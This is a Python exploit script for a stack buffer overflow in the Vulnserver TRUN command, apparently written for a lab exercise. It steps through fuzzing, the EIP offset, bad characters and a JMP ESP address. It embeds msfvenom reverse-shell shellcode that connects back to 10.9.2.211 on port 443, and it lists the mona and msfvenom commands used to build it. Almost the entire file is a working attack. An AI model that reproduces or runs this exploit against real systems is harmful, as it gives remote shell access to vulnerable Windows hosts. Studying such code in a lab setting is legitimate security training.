import buff


target = ("10.10.39.66", 9999)

# From Spiking I learnt what the prefix is
runner = buff.Buff(target = target, prefix = "TRUN /.:/")


"""
FIRST CREATE WOKRING DIRECTORY!!!
!mona config -set workingfolder c:\mona\%p
"""



# ----- 1. FUZZING -----
# Crashed at 2000
# runner.fuzz()



# ----- 2. Send Unique Characters -----
# Set Buffer Size
BUFFER_SIZE = 2400
runner.setBufferSize(BUFFER_SIZE)

# runner.sendPattern()



# ----- 3. Find EIP Offset -----
"""
!mona findmsp -distance 2400
"""
# offset = buff.generator.findPatternOffset(BUFFER_SIZE, "v1Av")
# print(offset)

# Set Eip offset
EIP_OFFSET = 2003
runner.setEipOffset(EIP_OFFSET)



# ----- 4. Find Bad Characters -----
"""
!mona bytearray -b "\x00"
!mona compare -f C:\mona\vulnserver\bytearray.bin -a 0187F9E0
"""
# runner.sendBadChars(exclude = [])



# ----- 5. Send Exploit -----
"""
Find JMP ESP
!mona jmp -r esp -cpb "\"x00

Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.211 LPORT=443 EXITFUNC=thread -b "\x00" -f c 
"""

# Set return address (in reverse)
eip_address = "\xaf\x11\x50\x62"
runner.setEipAddress(eip_address)

exploit = (
    "\xda\xcf\xd9\x74\x24\xf4\x5a\xbf\x36\xc9\x40\xa8\x31\xc9\xb1"
    "\x52\x31\x7a\x17\x03\x7a\x17\x83\xf4\xcd\xa2\x5d\x04\x25\xa0"
    "\x9e\xf4\xb6\xc5\x17\x11\x87\xc5\x4c\x52\xb8\xf5\x07\x36\x35"
    "\x7d\x45\xa2\xce\xf3\x42\xc5\x67\xb9\xb4\xe8\x78\x92\x85\x6b"
    "\xfb\xe9\xd9\x4b\xc2\x21\x2c\x8a\x03\x5f\xdd\xde\xdc\x2b\x70"
    "\xce\x69\x61\x49\x65\x21\x67\xc9\x9a\xf2\x86\xf8\x0d\x88\xd0"
    "\xda\xac\x5d\x69\x53\xb6\x82\x54\x2d\x4d\x70\x22\xac\x87\x48"
    "\xcb\x03\xe6\x64\x3e\x5d\x2f\x42\xa1\x28\x59\xb0\x5c\x2b\x9e"
    "\xca\xba\xbe\x04\x6c\x48\x18\xe0\x8c\x9d\xff\x63\x82\x6a\x8b"
    "\x2b\x87\x6d\x58\x40\xb3\xe6\x5f\x86\x35\xbc\x7b\x02\x1d\x66"
    "\xe5\x13\xfb\xc9\x1a\x43\xa4\xb6\xbe\x08\x49\xa2\xb2\x53\x06"
    "\x07\xff\x6b\xd6\x0f\x88\x18\xe4\x90\x22\xb6\x44\x58\xed\x41"
    "\xaa\x73\x49\xdd\x55\x7c\xaa\xf4\x91\x28\xfa\x6e\x33\x51\x91"
    "\x6e\xbc\x84\x36\x3e\x12\x77\xf7\xee\xd2\x27\x9f\xe4\xdc\x18"
    "\xbf\x07\x37\x31\x2a\xf2\xd0\x34\xa2\xfe\xf3\x21\xb6\xfe\xf2"
    "\x0a\x3f\x18\x9e\x7c\x16\xb3\x37\xe4\x33\x4f\xa9\xe9\xe9\x2a"
    "\xe9\x62\x1e\xcb\xa4\x82\x6b\xdf\x51\x63\x26\xbd\xf4\x7c\x9c"
    "\xa9\x9b\xef\x7b\x29\xd5\x13\xd4\x7e\xb2\xe2\x2d\xea\x2e\x5c"
    "\x84\x08\xb3\x38\xef\x88\x68\xf9\xee\x11\xfc\x45\xd5\x01\x38"
    "\x45\x51\x75\x94\x10\x0f\x23\x52\xcb\xe1\x9d\x0c\xa0\xab\x49"
    "\xc8\x8a\x6b\x0f\xd5\xc6\x1d\xef\x64\xbf\x5b\x10\x48\x57\x6c"
    "\x69\xb4\xc7\x93\xa0\x7c\xe7\x71\x60\x89\x80\x2f\xe1\x30\xcd"
    "\xcf\xdc\x77\xe8\x53\xd4\x07\x0f\x4b\x9d\x02\x4b\xcb\x4e\x7f"
    "\xc4\xbe\x70\x2c\xe5\xea"
)
runner.setExploit(exploit)

# set padding
runner.setPaddingSize(16)

# runner.sendExploit()
